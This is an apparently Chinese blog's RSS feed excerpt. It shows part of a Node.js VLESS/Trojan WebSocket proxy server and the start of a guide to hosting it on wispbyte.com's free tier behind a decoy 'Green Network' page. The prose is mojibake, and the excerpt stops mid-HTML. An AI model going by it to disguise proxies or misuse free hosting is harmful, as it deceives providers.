&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          duplex.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;this&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;duplex&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      .catch&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        net.connect&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; host, port &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset &amp;lt; msg.length&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            this.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          duplex.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;this&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;duplex&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; true&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// Ws è¿æ¥å¤„ç†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wss.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;connection&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, req&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; req.url &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ws.once&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.length &amp;gt; &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1, 17&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;isVless&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; id.every&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;v, i&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;v&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; parseInt&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;uuid.substr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i * 2, 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, 16&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;isVless&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!handleVlessConnection&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, msg&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          ws.close&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!handleTrojanConnection&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, msg&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      ws.close&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;httpServer.listen&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PORT, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;scheme&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; tlsOptions ? &lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTPS/WSS&amp;#39;&lt;/span&gt; : &lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP/WS&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  console.log&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;Server is running on &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;scheme&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; port &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PORT&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…¶ä¸­å‡ ä¸ªåœ°æ–¹æœ‰ä¿®æ”¹ï¼Œå…ˆçœ‹çœ‹huggingfaceç»™å’±ä»¬çš„åŸŸåï¼Œå³è¾¹ï¼ŒSettingså³è¾¹çš„ä¸‰ä¸ªç‚¹æŒ‰é’®ï¼Œ&lt;/p&gt;</description>
    </item>
    <item>
      <title>wispbyte.comè–…ç¾Šæ¯›è®°</title>
      <link>https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/</link>
      <pubDate>Thu, 01 Jan 2026 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/</guid>
      <description>&lt;p&gt;æœ‰äº†Codexçš„åŠ æŒï¼Œä¹Ÿæ¸æ¸å¾—ç–¯ç‹‚èµ·æ¥äº†ï¼Œæœ¬èº«è¿ç»´å°±æ˜¯å…¨å¹²ï¼Œå¯¹ç³»ç»Ÿçš„å„ä¸ªç‚¹æŠŠæ§å°±æ¯”è¾ƒç²¾å‡†&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡å‡†å¤‡è–…ç¾Šæ¯›çš„æ˜¯ wispbyte.com , æ˜¯æ¬§æ´²çš„ä¸€ä¸ªå‚å®¶&lt;/p&gt;
&lt;p&gt;å®ƒå¯ä»¥å…è´¹å»ºç«‹ä¸€ä¸ªserverï¼Œå‡†ç¡®çš„æ¥è¯´æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå¹¶ä¸”æš´éœ²ä¸€ä¸ªç«¯å£å‡ºæ¥&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260102172243875&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/image-20260102172243875.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£å…ˆCreate Serverï¼ŒServer Name å’Œ Server Descriptionå°±éƒ½å†™  god01 å¥½äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260102172435838&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/image-20260102172435838.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Server Typeå½“ç„¶é€‰Free Plançš„ï¼Œè¿è¡Œç¯å¢ƒå°±é€‰NodeJS&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260102172459520&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/image-20260102172459520.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é€‰å®Œå°±æŒ‰æœ€ä¸‹é¢çš„&lt;strong&gt;åˆ›å»º&lt;/strong&gt;å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å»ºå¥½äº†é‚£å°±å»åˆ° serverçš„manageç®¡ç†ç•Œé¢ï¼Œä¸‹é¢æœ‰ä¸ªStartupï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260102172759672&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/image-20260102172759672.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ†æé‚£å¥å‘½ä»¤ï¼Œæ„æ€å¾ˆç®€å•ï¼Œå¦‚æœé…äº†gitï¼Œå°±å»æ‹‰ä»£ç ï¼Œå¦‚æœæœ‰å­˜åœ¨npmçš„package.jsonï¼Œå°±å…ˆnpm installå®‰è£…ï¼Œæœ€åï¼Œè¿è¡Œindex.js&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æ˜¯Docker Imageï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯å¯ä»¥éšä¾¿å¼•ç”¨åˆ«å¤„çš„é•œåƒï¼Œç»“æœæ˜¯ä¸èƒ½ï¼Œåªèƒ½é€‰å›ºå®šçš„ï¼Œé‚£å°±é€‰ä¸å¤ªæ¿€è¿›çš„ nodejs_22 ï¼Œä¿å­˜å¥½&lt;/p&gt;
&lt;p&gt;ç„¶åå°±ä»€ä¹ˆéƒ½ä¸ç”¨åŠ¨äº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260102173016033&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/image-20260102173016033.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå»åˆ°Filesé€‰é¡¹ï¼Œç¼ºçœè·¯å¾„æ˜¯ /hoe/container/&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260102173221647&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260101-wispbyte.com_vless_trojan/image-20260102173221647.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢å›¾æ˜¯å·²ç»å¼„å¥½çš„ï¼Œå¦‚æœæ˜¯æ–°æœåŠ¡å™¨ï¼Œæ˜¯ç©ºæ— ä¸€ç‰©çš„&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åªéœ€è¦å‡†å¤‡5ä¸ªæ–‡ä»¶å’Œä¸€ä¸ªåŸŸåï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;tls.crt è¯ä¹¦æ–‡ä»¶ï¼Œç”¨let&amp;rsquo;s encryptç”³è¯·&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;tls.key å¯†é’¥æ–‡ä»¶ï¼Œç”¨let&amp;rsquo;s encryptç”³è¯·&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;index.html ç”¨æ¥è£…é¥°çš„ç¯ä¿å•é¡µé¢ï¼Œå¦‚æœä¸åŠ ï¼Œå°±ä¼šæ˜¾ç¤ºhello worldï¼Œå¤ªå‡äº†ï¼Œå¯ä»¥è®© gemini ç»™ä½ ç”Ÿæˆä¸€ä¸ªï¼Œä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;title&amp;gt;Green Network - Protect Earth&amp;lt;/title&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;style&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        * &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            margin: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            padding: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            box-sizing: border-box&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            font-family: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Segoe UI&amp;#39;&lt;/span&gt;, Tahoma, Geneva, Verdana, sans-serif&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        :root &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            --primary: &lt;span class=&#34;c1&#34;&gt;#2e7d32;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            --secondary: &lt;span class=&#34;c1&#34;&gt;#4caf50;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            --accent: &lt;span class=&#34;c1&#34;&gt;#8bc34a;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            --light: &lt;span class=&#34;c1&#34;&gt;#e8f5e9;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            --dark: &lt;span class=&#34;c1&#34;&gt;#1b5e20;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            --text: &lt;span class=&#34;c1&#34;&gt;#333333;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            --white: &lt;span class=&#34;c1&#34;&gt;#ffffff;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        body &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            background-color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--light&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            color: var&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;--text&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
